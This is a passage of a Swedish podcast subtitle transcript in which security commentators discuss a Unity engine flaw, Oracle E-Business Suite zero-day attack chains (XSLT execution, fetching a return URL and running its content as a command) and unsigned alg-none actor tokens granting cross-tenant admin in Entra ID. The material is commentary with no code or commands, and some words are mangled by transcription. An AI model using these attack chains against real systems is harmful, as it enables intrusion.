`1248 00:30:16,820 --> 00:30:18,100`
Och försöker förstå vad de nog menar



`1249 00:30:18,600 --> 00:30:20,400`
Så antar jag att det är typ



`1250 00:30:20,660 --> 00:30:21,940`
En osäker XML



`1251 00:30:22,200 --> 00:30:23,980`
Som på något sätt



`1252 00:30:24,500 --> 00:30:25,000`
Kan



`1253 00:30:25,520 --> 00:30:27,060`
Kolla upp lokala filer



`1254 00:30:27,320 --> 00:30:29,880`
I minnet i Unity-motorn



`1255 00:30:30,380 --> 00:30:36,520`
Ja och förmodligen så måste det ju vara i något API som används i ganska många spel tänker jag



`1256 00:30:37,560 --> 00:30:41,140`
Ja eller om det är någonting som skeppas med typ här



`1257 00:30:41,400 --> 00:30:42,420`
By default



`1258 00:30:42,680 --> 00:30:44,720`
I det som



`1259 00:30:45,480 --> 00:30:46,520`
Det du trycker ner i spelet



`1260 00:30:46,820 --> 00:30:49,380`
Bra fråga



`1261 00:30:49,640 --> 00:30:52,440`
Men på något sätt måste ju finnas en exploit-vektor här liksom



`1262 00:30:55,000 --> 00:30:58,840`
Men du kan bli i spelet är liksom väsentligen



`1263 00:30:59,100 --> 00:31:00,120`
Impact



`1264 00:31:00,380 --> 00:31:03,200`
Du får samma privilegier som spelet har



`1265 00:31:03,720 --> 00:31:05,760`
Så jag funderar på



`1266 00:31:06,020 --> 00:31:06,780`
Alltså i och med att



`1267 00:31:07,800 --> 00:31:10,360`
Jag funderar på om det är någon form av asset



`1268 00:31:10,620 --> 00:31:13,960`
Om du får den från någon spelserver eller något så



`1269 00:31:14,720 --> 00:31:16,260`
Så



`1270 00:31:16,260 --> 00:31:19,580`
Så kanske den helt enkelt exekverar på din lokala grej



`1271 00:31:19,840 --> 00:31:21,640`
Så kan det ju vara



`1272 00:31:22,140 --> 00:31:24,960`
Okej det här sker på klienten då



`1273 00:31:25,220 --> 00:31:30,600`
Och då gissar jag på att då betyder det att då måste du ju spofa servern för att kunna skicka någonting till



`1274 00:31:30,860 --> 00:31:32,900`
Det måste ju inte vara så, det här kan ju vara en helt lokal attack



`1275 00:31:33,420 --> 00:31:35,720`
Alltså en lokal attack mot klienten



`1276 00:31:35,980 --> 00:31:37,500`
Ett icke-autentiserat API i klienten på något sätt



`1277 00:31:37,760 --> 00:31:42,380`
Ja eller om det finns någon multi-spelsfunktion



`1278 00:31:42,620 --> 00:31:44,420`
Alltså kan det vara sådant där



`1279 00:31:44,420 --> 00:31:50,560`
Hur ett effektivt exploit-vektor skulle se ut i olika spel är ju lite oklart



`1280 00:31:50,820 --> 00:31:56,200`
Men jag tänker till exempel spel där användarna får ladda upp egna assets och sådant



`1281 00:31:56,460 --> 00:32:00,540`
De kanske går ner i den sårbara koden på någon vänster



`1282 00:32:00,800 --> 00:32:02,340`
Någon slags objekt som man har craftat eller något där



`1283 00:32:02,600 --> 00:32:03,620`
Ja men typ får du



`1284 00:32:03,880 --> 00:32:07,980`
Får du ladda upp egna banor eller får du ladda upp



`1285 00:32:08,220 --> 00:32:11,040`
Ja det är sant, det är inte orimligt



`1286 00:32:11,560 --> 00:32:14,380`
Vet vi några spel som kör Unity?



`1287 00:32:14,680 --> 00:32:15,180`
Massor



`1288 00:32:16,980 --> 00:32:18,260`
Nämn två



`1289 00:32:20,060 --> 00:32:23,640`
Men Unity, det är väl



`1290 00:32:23,900 --> 00:32:24,920`
Unreal



`1291 00:32:25,180 --> 00:32:26,960`
Nej det är en annan spröjlmotor



`1292 00:32:27,220 --> 00:32:31,060`
Jag kan inte, jag vet inte exakt vilka



`1293 00:32:31,320 --> 00:32:35,420`
Men alltså Unity, 75% av alla spel eller något eller?



`1294 00:32:35,660 --> 00:32:40,280`
Jag kan säga att den sista spelappen jag laddade ner till min telefon var byggd med Unity



`1295 00:32:40,780 --> 00:32:41,820`
Det var igår



`1296 00:32:42,580 --> 00:32:43,860`
Sen tog jag bort det spelet



`1297 00:32:43,860 --> 00:32:44,380`
Inte av denna



`1298 00:32:44,680 --> 00:32:45,700`
Bara för att det var sög



`1299 00:32:46,460 --> 00:32:51,340`
Jag raderar våra spel som jag fastnar i som ett tuggummi



`1300 00:32:51,580 --> 00:32:55,420`
Men jag skulle säga att Unity är väl den absolut största spelmotorn



`1301 00:32:55,680 --> 00:33:00,300`
Ja och några börjar röra sig mot Gadot och det finns någonting annat som



`1302 00:33:00,540 --> 00:33:02,340`
Ja men det är för att lyfta lite mindre typ



`1303 00:33:03,360 --> 00:33:04,380`
Pixelartiga



`1304 00:33:04,640 --> 00:33:07,720`
Men typ om du



`1305 00:33:08,220 --> 00:33:10,280`
Jag har inte 100% koll men folk var väl



`1306 00:33:10,540 --> 00:33:14,120`
Lite missnöjda för något licensvillkor eller någonting sådär



`1307 00:33:14,420 --> 00:33:19,020`
Så det är ju skett några drives mot att man vill



`1308 00:33:19,280 --> 00:33:22,100`
Några vill överge den men jag tror de



`1309 00:33:22,620 --> 00:33:27,480`
De flesta spel som inte kommer från AAA-tillverkarna kör väl det här



`1310 00:33:27,980 --> 00:33:31,060`
Ja men det tror jag och även en del av AAA-tillverkarna kör detta



`1311 00:33:31,320 --> 00:33:33,620`
Alla kör ju inte sina egna spelmotorer



`1312 00:33:34,140 --> 00:33:39,000`
Men typ om du laddar hem ett spel från Steam så är det hög sannolikhet att det är byggt i Unity



`1313 00:33:39,260 --> 00:33:42,840`
70% av top 1000 mobile games were made with Unity



`1314 00:33:43,100 --> 00:33:44,380`
Bra jobbat Unity



`1315 00:33:44,680 --> 00:33:46,980`
Men



`1316 00:33:48,260 --> 00:33:50,560`
Kul men lite oklart var vektorn är



`1317 00:33:50,820 --> 00:33:53,120`
Jag skulle tänka mig att det också



`1318 00:33:53,380 --> 00:33:54,920`
Kunde kunna vara en attack mot klienten



`1319 00:33:55,180 --> 00:33:57,740`
Låt säga att spelet körs med en högre rättighet än vad du har



`1320 00:33:58,500 --> 00:34:01,580`
Ja då undrar du ju definitivt



`1321 00:34:02,600 --> 00:34:04,640`
Vem vill inte köra sitt spel som system



`1322 00:34:04,900 --> 00:34:10,020`
Du kör ju alltid i högerklicka Run as admin



`1323 00:34:10,280 --> 00:34:13,340`
Har du någonsin kört spel på något annat sen?



`1324 00:34:13,340 --> 00:34:14,380`
Nej för då startar de ju till



`1325 00:34:14,680 --> 00:34:18,780`
Jag måste ju trycka en massa rutor och hålla på



`1326 00:34:19,280 --> 00:34:20,060`
Då kan man ju inte hålla på



`1327 00:34:20,560 --> 00:34:22,360`
Men du från LFI till SSRF



`1328 00:34:22,620 --> 00:34:26,460`
Det är mycket roliga såhär egentligen webbsåbarheter fast de inte är webb



`1329 00:34:26,700 --> 00:34:29,020`
Ja men det kanske är ett tema



`1330 00:34:30,800 --> 00:34:34,380`
Nu är väl Oracle e-business suite



`1331 00:34:34,640 --> 00:34:38,480`
Den är väl typ webb antar jag



`1332 00:34:39,000 --> 00:34:42,580`
Men de har ju rått sig med att ha



`1333 00:34:42,840 --> 00:34:43,860`
Malware-grupper



`1334 00:34:43,860 --> 00:34:47,180`
Som leker med Zero Days



`1335 00:34:47,960 --> 00:34:48,460`
Och



`1336 00:34:48,980 --> 00:34:50,520`
I ena fallet så



`1337 00:34:51,020 --> 00:34:54,360`
Var det osams de olika malware-teamen



`1338 00:34:54,620 --> 00:34:59,480`
Så ett ransomware släppte någonting på ryska som tydligen innehöll



`1339 00:35:00,760 --> 00:35:04,340`
Det innehöll så många dåliga ord på ryska



`1340 00:35:04,600 --> 00:35:06,140`
Deras ordval



`1341 00:35:06,380 --> 00:35:10,740`
Varken i originalspråk eller med någon trogen översättning



`1342 00:35:11,000 --> 00:35:13,300`
Var liksom inte okej enligt Youtube liksom såhär



`1343 00:35:13,300 --> 00:35:13,820`
Utan de



`1344 00:35:14,120 --> 00:35:18,720`
Folk såhär aktivt valde att inte återge de exakta ordavvalen



`1345 00:35:18,980 --> 00:35:21,540`
Men ett ransomware-team alltså



`1346 00:35:21,800 --> 00:35:25,900`
Kommit över Zero Daysen för ett annat ransomware-team och



`1347 00:35:28,460 --> 00:35:32,040`
Droppade det här i något publikt forum och



`1348 00:35:32,540 --> 00:35:38,700`
Även hävdade att de skulle ha doxat alla medlemmarna till FSB och för att FSB skulle komma



`1349 00:35:38,940 --> 00:35:42,780`
Och skjuta ihjäl deras onda konkurrenter och sådär



`1350 00:35:43,040 --> 00:35:43,820`
Och så låg man



`1351 00:35:44,120 --> 00:35:45,140`
Inget annat för sig just nu



`1352 00:35:45,400 --> 00:35:45,900`
Nej



`1353 00:35:47,960 --> 00:35:49,500`
Men



`1354 00:35:50,260 --> 00:35:51,540`
Det var



`1355 00:35:51,800 --> 00:35:55,120`
Den ena taktvektorn, båda taktvektorn är



`1356 00:35:55,380 --> 00:35:58,460`
Du befinner dig på utsidan, du har inga som helst rättigheter



`1357 00:35:58,700 --> 00:36:02,300`
Men någon har lagt upp sin Oracle i Business Suite



`1358 00:36:02,540 --> 00:36:06,140`
Så du kan nå den, du kan kommunicera med den över internet eller på något annat sätt



`1359 00:36:06,640 --> 00:36:09,460`
Så då går du som oautentiserad



`1360 00:36:09,720 --> 00:36:12,020`
I den ena vektorn så säger du



`1361 00:36:12,540 --> 00:36:13,040`
Hej



`1362 00:36:13,040 --> 00:36:14,320`
Jag skulle vilja



`1363 00:36:14,580 --> 00:36:15,860`
Snacka med en



`1364 00:36:16,120 --> 00:36:17,900`
Viss sida som är



`1365 00:36:18,920 --> 00:36:19,960`
Någon



`1366 00:36:20,200 --> 00:36:22,260`
Preview-sida eller någonting



`1367 00:36:22,520 --> 00:36:30,200`
Och min preview-template är det här och så är det XHLT-kod som exekverar och XHLT



`1368 00:36:30,700 --> 00:36:33,780`
Läsaren har rätt att exekvera



`1369 00:36:34,040 --> 00:36:35,320`
Godtycklig JavaScript



`1370 00:36:35,820 --> 00:36:37,360`
Och därifrån kan du



`1371 00:36:37,880 --> 00:36:41,720`
Så blir du systemanvändare på Oracle-servern



`1372 00:36:43,040 --> 00:36:45,340`
Den andra var



`1373 00:36:47,140 --> 00:36:49,180`
Typ något snarlikt men



`1374 00:36:49,440 --> 00:36:51,240`
Men då skickar du istället in en



`1375 00:36:51,480 --> 00:36:52,760`
Du gör en



`1376 00:36:53,020 --> 00:36:54,040`
Post eller put



`1377 00:36:54,300 --> 00:36:57,120`
Där du skjuter upp en XML och så säger du i XMLen



`1378 00:36:57,380 --> 00:36:59,420`
Ja det är väl förresten return-URLen



`1379 00:37:00,200 --> 00:37:01,480`
Den är min server



`1380 00:37:01,980 --> 00:37:05,060`
Och då är det ju naturligtvis så att Oracle-tjänsten tycker att



`1381 00:37:05,320 --> 00:37:06,600`
Det är ju bra i det om jag



`1382 00:37:07,360 --> 00:37:11,200`
Går till den här return-URLen som jag fick oautentiserad från internet



`1383 00:37:11,720 --> 00:37:12,740`
Och så suger jag i mig



`1384 00:37:12,740 --> 00:37:14,540`
Vad som stod på return-URLen



`1385 00:37:15,300 --> 00:37:18,880`
Och sen så gör jag systemexecute på det



`1386 00:37:19,660 --> 00:37:22,460`
Om man väl kommit så långt så ska man ju ha något tillbaka



`1387 00:37:23,240 --> 00:37:24,520`
Så det är grejen är så så här



`1388 00:37:24,780 --> 00:37:27,580`
Vi har två olika attackkedjor här



`1389 00:37:27,840 --> 00:37:28,860`
Som båda känns som



`1390 00:37:29,120 --> 00:37:31,180`
När på 90-talet tyckte jag så här



`1391 00:37:31,420 --> 00:37:36,540`
Kommer du ihåg att du hatade på JSP för en inspelning som inte är jättelänge sedan



`1392 00:37:36,800 --> 00:37:38,340`
Typ förr förr eller någonting



`1393 00:37:38,600 --> 00:37:41,920`
Det finns .jsp med i åtminst



`1394 00:37:41,920 --> 00:37:46,280`
Åtminstone ett av de här exploitern så är .jsp inblandat



`1395 00:37:46,520 --> 00:37:47,560`
0% förvånad



`1396 00:37:48,060 --> 00:37:53,180`
De andra heter servlet så vi kan ju bara misstänka att det är en byggt java



`1397 00:37:53,440 --> 00:38:00,360`
Det är en byggt java har vi starka skäl att misstänka



`1398 00:38:00,600 --> 00:38:03,420`
Och det var inte den här veckan de byggde det



`1399 00:38:03,940 --> 00:38:04,700`
Nej



`1400 00:38:04,960 --> 00:38:08,540`
Den här veckan så försökte Oracle bygga Millenium vi såg ju det



`1401 00:38:08,800 --> 00:38:10,340`
Men det är ju liksom



`1402 00:38:10,340 --> 00:38:13,660`
Bygga och bygga, paktera om bajs till något annat



`1403 00:38:14,180 --> 00:38:15,200`
Men nej vad vet jag



`1404 00:38:15,460 --> 00:38:16,480`
Men när XSL



`1405 00:38:16,740 --> 00:38:18,780`
XSL till transform



`1406 00:38:19,300 --> 00:38:19,820`
Typ



`1407 00:38:20,060 --> 00:38:22,120`
Fattar hur det inträffar



`1408 00:38:22,380 --> 00:38:25,440`
Men varför man bygger en XML parser som



`1409 00:38:26,720 --> 00:38:32,360`
Tar en return url, laddar den och bara exekverar det som OS-kommando när den får jättekonstigt



`1410 00:38:32,620 --> 00:38:34,660`
Vi kör bara lite grejer



`1411 00:38:35,680 --> 00:38:36,460`
We'll do it live



`1412 00:38:37,980 --> 00:38:40,300`
Så om man körde Oracle IBD



`1413 00:38:40,600 --> 00:38:42,380`
Så var det happy days



`1414 00:38:42,640 --> 00:38:44,940`
I början på



`1415 00:38:45,200 --> 00:38:46,740`
Kring månadsskiftet



`1416 00:38:47,260 --> 00:38:49,040`
Förra månadsskiftet tror jag det var



`1417 00:38:49,820 --> 00:38:51,600`
Men kör man det så slutar man det



`1418 00:38:52,620 --> 00:38:54,160`
Stöd inte det där skitbolaget



`1419 00:38:54,420 --> 00:38:57,240`
Unsanitized input to exec



`1420 00:39:02,360 --> 00:39:07,740`
Oracle hade tagglinen unbreakable



`1421 00:39:07,980 --> 00:39:10,300`
Och de hade, vad hette hon, Marianne Davis



`1422 00:39:10,600 --> 00:39:11,880`
Eller så deras gamla



`1423 00:39:12,140 --> 00:39:14,940`
CISO som satt där i hundra år och



`1424 00:39:15,720 --> 00:39:21,860`
Var väldigt bra på att instigera märkliga trollbråk med security researchers



`1425 00:39:25,180 --> 00:39:25,960`
Skitbolag



`1426 00:39:26,720 --> 00:39:32,620`
Sorry men bra summerat



`1427 00:39:33,120 --> 00:39:37,220`
Ändå, det har kommit ganska lång tid sedan de blev stämda, det är ju trevligt



`1428 00:39:37,480 --> 00:39:39,520`
Alltså hur fan ska de stämma egentligen?



`1429 00:39:39,520 --> 00:39:40,540`
Det finns ju ingen ansvarig utgivare



`1430 00:39:40,800 --> 00:39:45,400`
Vi lär ju vara på en no fly list i USA så länge Trumpen sitter där borta i alla fall



`1431 00:39:45,660 --> 00:39:47,460`
Men det gör vi inte, vi tolkar inte någon



`1432 00:39:47,720 --> 00:39:50,520`
Nej, jag tror vi får stanna i Sverige, knappt det



`1433 00:39:51,300 --> 00:39:54,360`
Men Peter, ska vi tänka lite Azure också eller, när vi ändå håller på?



`1434 00:39:55,140 --> 00:39:56,420`
Ja, är det den grafen?



`1435 00:39:56,680 --> 00:39:57,700`
Ja



`1436 00:39:58,200 --> 00:40:03,580`
Jasper brukar ju älska Azure och trycka sig i så positiva termer



`1437 00:40:03,840 --> 00:40:05,640`
Mm, du älskar det, det är ju din favorit



`1438 00:40:05,880 --> 00:40:06,660`
Jag jobbar med



`1439 00:40:06,920 --> 00:40:07,420`
Jag gillar dem



`1440 00:40:07,940 --> 00:40:09,220`
Gästa månader jag säger



`1441 00:40:09,520 --> 00:40:15,400`
Tydligen så Azure Graph API kunde äta en speciell typ av tokens



`1442 00:40:15,920 --> 00:40:19,240`
Vad är det? Är det alltså Graph API för hela Azure?



`1443 00:40:19,500 --> 00:40:20,280`
Alltså, nu är det så här



`1444 00:40:20,780 --> 00:40:22,840`
Det är ingen som vet det



`1445 00:40:23,080 --> 00:40:25,140`
Dokumentation är ingenting vi jobbar med



`1446 00:40:25,400 --> 00:40:27,440`
Men det är en del i OAuth-flödet



`1447 00:40:27,700 --> 00:40:33,580`
En av 181 andra endpointer för att producera någon form av icke-standard OAuth



`1448 00:40:34,600 --> 00:40:35,380`
Ett Graph API



`1449 00:40:35,880 --> 00:40:37,940`
Men Graph API är väl



`1450 00:40:38,200 --> 00:40:39,480`
Det är väl ett



`1451 00:40:39,780 --> 00:40:40,280`
Effektivt



`1452 00:40:40,540 --> 00:40:41,820`
Det är ju någon ny



`1453 00:40:42,080 --> 00:40:43,620`
Hipp webb-teknologi där du



`1454 00:40:44,380 --> 00:40:44,900`
Istället



`1455 00:40:45,160 --> 00:40:46,440`
Den här sårbarheten har jag koll på



`1456 00:40:46,680 --> 00:40:47,720`
Det här är helt jävla



`1457 00:40:47,960 --> 00:40:50,280`
Ja men istället för att bygga



`1458 00:40:51,040 --> 00:40:53,600`
Specifika endpoints med SAM eller sånt så gör du



`1459 00:40:54,360 --> 00:40:55,640`
Alltså du



`1460 00:40:55,900 --> 00:40:57,440`
Tillgängliggör



`1461 00:40:57,700 --> 00:40:59,740`
Alla dina datakällor som



`1462 00:41:00,000 --> 00:41:03,320`
Typ en web-SQL-server eller sådär



`1463 00:41:03,580 --> 00:41:08,200`
Du kan hikta på grejer baserat lite på var de kommer ifrån



`1464 00:41:08,440 --> 00:41:09,220`
Jag vet vad ett Graph



`1465 00:41:09,520 --> 00:41:10,280`
API är



`1466 00:41:10,540 --> 00:41:12,080`
Det var mest utefter vad fan



`1467 00:41:12,340 --> 00:41:12,840`
Vad är det till för



`1468 00:41:13,100 --> 00:41:16,680`
Microsoft har ju en endpunkt som de kallar för Graph API



`1469 00:41:16,940 --> 00:41:18,740`
Men det här är Dirk-Johans



`1470 00:41:19,240 --> 00:41:21,040`
Ja det antar jag



`1471 00:41:21,300 --> 00:41:22,580`
Snubbes har gjort



`1472 00:41:22,840 --> 00:41:24,620`
Men den exponerar Azure



`1473 00:41:24,880 --> 00:41:25,400`
Okej



`1474 00:41:25,640 --> 00:41:30,000`
Skit men det är ett sätt att hålla koll på



`1475 00:41:30,260 --> 00:41:33,580`
I det här fallet din identitet i Azure



`1476 00:41:34,600 --> 00:41:36,920`
Och det är inte bara Azure Rd utan det är i Azure



`1477 00:41:37,160 --> 00:41:38,200`
Din identitet i Azure



`1478 00:41:38,440 --> 00:41:38,960`
Mm



`1479 00:41:38,960 --> 00:41:40,240`
Och det här är ju



`1480 00:41:40,500 --> 00:41:43,060`
Det här är one token to roll the malmins tänker jag



`1481 00:41:44,840 --> 00:41:45,880`
Så fortsätt



`1482 00:41:46,120 --> 00:41:47,400`
För det här är det här



`1483 00:41:47,660 --> 00:41:50,220`
Om någonting kommer lukta nation state så är det det här



`1484 00:41:51,000 --> 00:41:52,520`
Ja men



`1485 00:41:52,780 --> 00:41:57,640`
Vilka egenskaper förväntar sig Mattias från ett token



`1486 00:41:58,920 --> 00:42:01,740`
Unikt icke spoofbart och



`1487 00:42:02,000 --> 00:42:07,880`
Domenspecifikt alltså det ska vara tydligt styrt till ett syfte



`1488 00:42:08,960 --> 00:42:11,000`
Spoofing



`1489 00:42:11,260 --> 00:42:14,080`
Resistent var ju en egenskap som



`1490 00:42:14,340 --> 00:42:15,620`
Microsoft inte behövde



`1491 00:42:16,120 --> 00:42:17,660`
Så



`1492 00:42:18,180 --> 00:42:24,840`
Du har ju dom vanliga tokena som är signerade och innehåller sådana säkerhetskoncept vi är vana vid



`1493 00:42:25,080 --> 00:42:30,200`
Sen hade vi också den andra typen av tokens där man hoppade över och har signaturer med token



`1494 00:42:30,460 --> 00:42:31,240`
Det är ju lite det här att



`1495 00:42:31,480 --> 00:42:35,080`
Jaha vi ska hålla på och krångla med rättigheter men inte för mig va



`1496 00:42:35,320 --> 00:42:38,660`
Nej det gör vi inte så vi uppfyller en till jävla token



`1497 00:42:38,660 --> 00:42:40,460`
Vi tar en JVT och så kör vi såhär men



`1498 00:42:40,700 --> 00:42:45,820`
Någons det behöver vi inte ha och så kan vi köra med algoritm none och så ingen signering



`1499 00:42:46,080 --> 00:42:50,180`
Men okej då hade jag missförfattat det här för jag fick för mig att det här var någon sån token exchange



`1500 00:42:50,440 --> 00:42:52,220`
Grej som hade ballat ur



`1501 00:42:52,480 --> 00:42:54,020`
Så man fick liksom vilka token man vill



`1502 00:42:54,280 --> 00:42:57,600`
Så länge man hade ett token så kunde man switcha till en annan kontext men det här är alltså



`1503 00:42:57,860 --> 00:42:58,880`
Ännu dummare än så



`1504 00:42:59,140 --> 00:43:04,000`
Nej om jag har fattat rätt så är det ingen token exchange himla här det är bara



`1505 00:43:04,260 --> 00:43:06,560`
Give me the token och det är liksom



`1506 00:43:06,820 --> 00:43:07,840`
Det fanns en annan typ



`1507 00:43:07,840 --> 00:43:08,860`
Alltså jag tror att



`1508 00:43:09,120 --> 00:43:10,920`
Det fanns en annan typ av token än vad vi är vana



`1509 00:43:11,160 --> 00:43:13,480`
Dirkjohans blogg då, Dirkjohan har gjort Roadhouse



`1510 00:43:15,780 --> 00:43:18,840`
Roadhouse tool är väl en grej för alla redteamers som håller på med AD liksom



`1511 00:43:19,100 --> 00:43:20,640`
Men hans bloggpost är



`1512 00:43:21,160 --> 00:43:27,040`
One token to rule them all, obtain global admin in every entry ID tenant via actor tokens



`1513 00:43:28,320 --> 00:43:28,840`
Låter ju bra



`1514 00:43:29,080 --> 00:43:29,860`
Bra rubrik



`1515 00:43:30,120 --> 00:43:33,700`
Det är verkligen en sån här nation state token man bara kan tänka sig



`1516 00:43:33,960 --> 00:43:35,240`
Men framförallt så



`1517 00:43:35,480 --> 00:43:37,800`
Vore ju bra om de var signerade och inte vem som helst



`1518 00:43:38,100 --> 00:43:39,120`
Kunde krafta det de ville



`1519 00:43:39,380 --> 00:43:40,140`
Ja det hade varit bra



`1520 00:43:41,940 --> 00:43:42,960`
Men



`1521 00:43:43,220 --> 00:43:45,520`
Problemet är ju löst nu



`1522 00:43:45,780 --> 00:43:46,800`
Så de har ju fått



`1523 00:43:47,060 --> 00:43:49,880`
Ta bort den special token modellen



`1524 00:43:50,120 --> 00:43:51,660`
Det är säkert ingen som har utnyttjat det



`1525 00:43:52,940 --> 00:43:54,220`
Det är faktiskt en bra fråga



`1526 00:43:54,480 --> 00:43:56,280`
Det kommer såna här hål



`1527 00:43:56,520 --> 00:43:58,580`
Hur vet man om någon exploitat dem



`1528 00:43:58,840 --> 00:44:01,640`
Finns det någon magisk logg någonstans som kan berätta



`1529 00:44:01,900 --> 00:44:03,960`
När kom det till osignade token



`1530 00:44:04,200 --> 00:44:06,000`
Som var ondskefullt kraftad



`1531 00:44:06,260 --> 00:44:07,020`
Det finns ju ett



`1532 00:44:07,020 --> 00:44:07,800`
Dirkjohan har ju en



`1533 00:44:08,000 --> 00:44:11,120`
Black hat talk och defcon talk på detta



`1534 00:44:11,380 --> 00:44:14,960`
Och då säger han så här säger han i gränsen på sin egen bloggpost



`1535 00:44:15,220 --> 00:44:19,060`
While preparing for my black hat and defcon talks in July this year



`1536 00:44:19,320 --> 00:44:20,860`
I found the most impactful



`1537 00:44:21,120 --> 00:44:22,640`
Entra ID vulnerability



`1538 00:44:22,900 --> 00:44:24,440`
That I will probably ever find



`1539 00:44:25,200 --> 00:44:25,980`
The vulnerability



`1540 00:44:26,240 --> 00:44:27,760`
Could have allowed me to compromise



`1541 00:44:28,020 --> 00:44:29,040`
Every Entra



`1542 00:44:29,560 --> 00:44:31,100`
ID tenant in the world



`1543 00:44:31,360 --> 00:44:32,640`
Except probably those



`1544 00:44:32,880 --> 00:44:34,420`
In the national cloud deployment



`1545 00:44:35,200 --> 00:44:37,240`
If you are an Entra ID admin reading this



`1546 00:44:37,240 --> 00:44:40,060`
Yes, this means complete access to your tenant



`1547 00:44:40,320 --> 00:44:42,360`
The vulnerability consists of two components



`1548 00:44:42,620 --> 00:44:43,380`
Undocumented



`1549 00:44:43,640 --> 00:44:46,460`
Impersonation tokens called Acro tokens



`1550 00:44:46,720 --> 00:44:49,280`
And Microsoft uses their backend services



`1551 00:44:49,780 --> 00:44:51,320`
S2S communication



`1552 00:44:51,580 --> 00:44:53,620`
Additionally there was a critical flaw in the legacy



`1553 00:44:53,880 --> 00:44:54,640`
Azure ADI



`1554 00:44:54,900 --> 00:44:56,180`
Graph API



`1555 00:44:56,700 --> 00:44:59,760`
That failed to properly validate the organizing tenant



`1556 00:45:00,280 --> 00:45:03,600`
Allowing these tokens to be used to cross-tenant access



`1557 00:45:04,120 --> 00:45:04,880`
Alltså



`1558 00:45:05,400 --> 00:45:06,940`
Kan ju vara så att man bara



`1559 00:45:06,940 --> 00:45:08,980`
Två grejer här som är



`1560 00:45:09,240 --> 00:45:10,020`
Störande



`1561 00:45:10,780 --> 00:45:12,060`
Undocumented



`1562 00:45:12,820 --> 00:45:13,340`
Function



`1563 00:45:13,600 --> 00:45:14,100`
För det är också så här



`1564 00:45:14,360 --> 00:45:16,920`
Det är liksom det som är hela jävla



`1565 00:45:17,440 --> 00:45:18,460`
Grundproblemet Microsoft



`1566 00:45:18,720 --> 00:45:20,260`
Det är att de tror att det är liksom



`1567 00:45:20,760 --> 00:45:22,820`
Hemlig sås är bra sås



`1568 00:45:23,320 --> 00:45:24,600`
Nej det är inte det



`1569 00:45:24,860 --> 00:45:26,660`
Läckte inte dessutom hela deras jävla sås



`1570 00:45:26,900 --> 00:45:28,700`
Alltså jag tycker såsen läcker hela tiden



`1571 00:45:28,960 --> 00:45:30,500`
De har ju haft ryssare i repot länge



`1572 00:45:31,000 --> 00:45:32,800`
Men det är det jag menar så här



`1573 00:45:33,060 --> 00:45:34,840`
Det här är bound to happen



`1574 00:45:35,100 --> 00:45:36,640`
Och så glömmer man då av en API



`1575 00:45:36,940 --> 00:45:40,520`
Som man ändå ska störa för bakåtkompatibilitet är ju superbra för internetsäkerhet



`1576 00:45:40,780 --> 00:45:42,820`
Det har man ju vetat sedan RC4



`1577 00:45:43,340 --> 00:45:44,100`
Vad vet jag



`1578 00:45:44,360 --> 00:45:45,380`
Men hur som helst



`1579 00:45:46,160 --> 00:45:48,720`
Här är ju ett grundproblem i och med att vi inte



`1580 00:45:48,980 --> 00:45:51,280`
Vi får säkerhetsresurser som orkar få sitta och gissa



`1581 00:45:51,780 --> 00:45:56,660`
Och då kan man ju då 2025 uppenbarligen hitta liksom on-broad internetdöd



`1582 00:45:57,160 --> 00:45:59,720`
För att man inte har tänkt igenom sitt autorisationsflöde



`1583 00:45:59,980 --> 00:46:00,500`
För jag menar



`1584 00:46:00,740 --> 00:46:02,800`
Alltså authentication och autorisation är ju ändå lätt



`1585 00:46:03,300 --> 00:46:05,620`
Det kan vi komma överens om redan som det är



`1586 00:46:05,860 --> 00:46:06,640`
Roll your own



`1587 00:46:06,940 --> 00:46:12,820`
Alla guider till hur du jobbar med JVT och säkra upp dem



`1588 00:46:13,340 --> 00:46:17,940`
Så brukar det ju alltid stå att Algnon ska inte accepteras



`1589 00:46:18,200 --> 00:46:19,480`
Var det till och med den?



`1590 00:46:19,740 --> 00:46:20,500`
Det var Algnon



`1591 00:46:20,760 --> 00:46:21,540`
Algnon



`1592 00:46:21,780 --> 00:46:23,580`
Jag har tittat just nu



`1593 00:46:23,840 --> 00:46:26,140`
Tänkte att de bara failade och skete i att verifiera



`1594 00:46:26,400 --> 00:46:28,180`
Men det är ju en klassisk Algnon alltså



`1595 00:46:28,440 --> 00:46:33,820`
Algnon typ JVT och så sen alla egenskaper de vill ha



`1596 00:46:34,080 --> 00:46:36,120`
Och så sen ingen signatur



`1597 00:46:36,120 --> 00:46:39,440`
Och det är väl naturligt att det inte är någon signatur om det är Algnon liksom



`1598 00:46:39,700 --> 00:46:40,480`
Vad ska du signera?



`1599 00:46:42,260 --> 00:46:44,320`
Men såhär, varför har inte detta upptäckts?



`1600 00:46:44,560 --> 00:46:45,340`
Jo för att



`1601 00:46:45,840 --> 00:46:46,880`
Det är en



`1602 00:46:47,120 --> 00:46:48,160`
Det är en



`1603 00:46:48,660 --> 00:46:51,220`
Säkert ett verbet eller resursen vi pratar om



`1604 00:46:51,480 --> 00:46:53,020`
Finns inte i någon dokumentation



`1605 00:46:53,520 --> 00:46:55,580`
Så helt plötsligt så springer man över någonting



`1606 00:46:55,840 --> 00:46:56,860`
Alltså hur



`1607 00:46:57,120 --> 00:46:57,620`
Alltså såhär



`1608 00:46:57,880 --> 00:46:59,160`
Det här kan ju inte vara bra för någon



`1609 00:47:00,180 --> 00:47:01,460`
Nej nej



`1610 00:47:01,720 --> 00:47:02,480`
Nej nej



`1611 00:47:02,740 --> 00:47:04,800`
Det skulle ju vara NSA eller någon annan



`1612 00:47:04,800 --> 00:47:08,640`
Men NSA kan ju förmodligen be om accessen bara istället



`1613 00:47:08,900 --> 00:47:11,200`
Ja men det är ju enklare att bara kunna dra ut en token lite snabbt



`1614 00:47:11,460 --> 00:47:12,740`
Då kan man ju också ha hämtat att man inte visste



`1615 00:47:13,240 --> 00:47:19,400`
Men man kan ju vara dum och övda att om du nu ska bygga in en jävligt allvarlig sårbarhet



`1616 00:47:19,640 --> 00:47:21,440`
Så är det ju dumt att dokumentera den så hela världen vet om den



`1617 00:47:21,700 --> 00:47:24,260`
Det är ju också väldigt sant



`1618 00:47:24,520 --> 00:47:26,820`
Det är väl självklart att det är så



`1619 00:47:27,080 --> 00:47:31,160`
Men sen ska man inte förkunna, alltså Dirkan är ju en gud, han är ju jätteduktig



`1620 00:47:31,420 --> 00:47:32,700`
Han är ju förmodligen den som kan det här



`1621 00:47:32,960 --> 00:47:33,720`
Bäst i världen



`1622 00:47:34,240 --> 00:47:34,760`
Så det är ju coolt



`1623 00:47:35,060 --> 00:47:35,820`
Men



`1624 00:47:36,080 --> 00:47:40,940`
Men jag vet inte om jag ska säga bakdörr för det verkar lite för korkat



`1625 00:47:41,200 --> 00:47:42,740`
